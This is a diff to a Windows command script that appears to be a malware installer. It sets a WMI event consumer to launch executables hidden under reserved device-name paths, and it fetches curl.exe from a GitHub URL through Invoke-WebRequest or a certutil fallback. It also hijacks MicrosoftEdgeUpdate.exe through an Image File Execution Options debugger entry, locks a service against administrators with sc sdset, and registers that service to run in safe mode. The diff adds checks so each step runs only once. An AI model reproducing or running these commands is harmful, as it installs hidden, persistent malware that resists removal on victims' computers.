@@ -3,10 +3,10 @@ wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="
 powershell.exe -NoProfile -Command "$target = '%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='LUN'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
 dir "%ProgramData%\curl.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
 dir "%ProgramData%\curl.exe" >nul || certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/curl.exe" "%ProgramData%\curl.exe"
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
-sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /VE /T REG_SZ /F /D "Service"
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /VE /T REG_SZ /F /D "Service"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger >nul || reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v Security >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 rd /S /Q \\.\%ProgramData%\AUX..\
 rd /S /Q \\.\%ProgramData%\CON..\
 rd /S /Q \\.\%ProgramData%\NUL..\
